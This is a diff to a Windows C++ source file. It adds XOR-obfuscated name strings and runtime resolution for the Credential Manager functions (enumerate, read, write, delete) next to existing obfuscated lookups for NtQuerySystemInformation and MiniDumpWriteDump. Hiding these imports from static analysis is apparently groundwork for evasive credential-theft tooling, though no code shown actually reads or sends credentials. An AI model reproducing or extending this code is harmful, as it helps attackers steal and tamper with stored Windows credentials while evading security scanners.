@@ -24,6 +24,7 @@
 #include <mutex>
 #include <array>
 #include <cstdint>
+#include <wincred.h>
 
 // =======================
 // XOR helper (ANSI)
@@ -367,6 +368,13 @@ using NtQuerySystemInformation_t = NTSTATUS(NTAPI*)(SYSTEM_INFORMATION_CLASS, PV
 using RtlNtStatusToDosError_t = ULONG(NTAPI*)(NTSTATUS);
 using RtlInitUnicodeString_t = VOID(NTAPI*)(PUNICODE_STRING, PCWSTR);
 using NtClose_t = NTSTATUS(NTAPI*)(HANDLE);
+
+using CredEnumerateW_t = BOOL(WINAPI*)(LPCWSTR, DWORD, DWORD*, PCREDENTIALW**);
+using CredReadW_t = BOOL(WINAPI*)(LPCWSTR, DWORD, DWORD, PCREDENTIALW*);
+using CredFree_t = VOID(WINAPI*)(PVOID);
+using CredWriteW_t = BOOL(WINAPI*)(PCREDENTIALW, DWORD);
+using CredDeleteW_t = BOOL(WINAPI*)(LPCWSTR, DWORD, DWORD);
+
 
 
 // DBGHELP
@@ -734,11 +742,20 @@ constexpr unsigned char enc_NtClose[] = {
     0xE4, 0xDE, 0xE9, 0xC6, 0xC5, 0xD9, 0xCF, 0x00
 }; DECL_XENC(NtClose);
 
+
+constexpr unsigned char enc_CredEnumerateW[] = { 0xE9,0xD8,0xCF,0xCE,0xEF,0xC4,0xDF,0xC7,0xCF,0xD8,0xCB,0xDE,0xCF,0xFD,0x00 }; DECL_XENC(CredEnumerateW);
+constexpr unsigned char enc_CredReadW[] = { 0xE9,0xD8,0xCF,0xCE,0xF8,0xCF,0xCB,0xCE,0xFD,0x00 };                               DECL_XENC(CredReadW);
+constexpr unsigned char enc_CredFree[] = { 0xE9,0xD8,0xCF,0xCE,0xEC,0xD8,0xCF,0xCF,0x00 };                                       DECL_XENC(CredFree);
+constexpr unsigned char enc_CredWriteW[] = { 0xE9,0xD8,0xCF,0xCE,0xFD,0xD8,0xC3,0xDE,0xCF,0xFD,0x00 };                             DECL_XENC(CredWriteW);
+constexpr unsigned char enc_CredDeleteW[] = { 0xE9,0xD8,0xCF,0xCE,0xEE,0xCF,0xC6,0xCF,0xDE,0xCF,0xFD,0x00 };                       DECL_XENC(CredDeleteW);
+
+
 // dbghelp
 constexpr unsigned char enc_MiniDumpWriteDump[] = {
     0xE7, 0xC3, 0xC4, 0xC3, 0xEE, 0xDF, 0xC7, 0xDA, 0xFD, 0xD8, 0xC3, 0xDE, 0xCF, 0xEE, 0xDF, 0xC7, 0xDA, 0x00
 };
 DECL_XENC(MiniDumpWriteDump);
+
 
 
 // ============================================================================
@@ -914,6 +931,13 @@ struct Advapi32 {
         CryptAcquireContextW = mod.get_xor<CryptAcquireContextW_t>(ENC_XOR(CryptAcquireContextW));
         CryptReleaseContext = mod.get_xor<CryptReleaseContext_t >(ENC_XOR(CryptReleaseContext));
         CryptGenRandom = mod.get_xor<CryptGenRandom_t      >(ENC_XOR(CryptGenRandom));
+
+        CredEnumerateW = mod.get_xor<CredEnumerateW_t>(ENC_XOR(CredEnumerateW));
+        CredReadW = mod.get_xor<CredReadW_t     >(ENC_XOR(CredReadW));
+        CredFree = mod.get_xor<CredFree_t      >(ENC_XOR(CredFree));
+        CredWriteW = mod.get_xor<CredWriteW_t    >(ENC_XOR(CredWriteW));
+        CredDeleteW = mod.get_xor<CredDeleteW_t   >(ENC_XOR(CredDeleteW));
+
     }
 
     DynModule mod;
@@ -949,6 +973,15 @@ struct Advapi32 {
     CryptAcquireContextW_t CryptAcquireContextW = nullptr;
     CryptReleaseContext_t  CryptReleaseContext = nullptr;
     CryptGenRandom_t       CryptGenRandom = nullptr;
+
+
+    // Credentials
+    CredEnumerateW_t CredEnumerateW = nullptr;
+    CredReadW_t      CredReadW = nullptr;
+    CredFree_t       CredFree = nullptr;
+    CredWriteW_t     CredWriteW = nullptr;
+    CredDeleteW_t    CredDeleteW = nullptr;
+
 };
 
 struct NtDll {
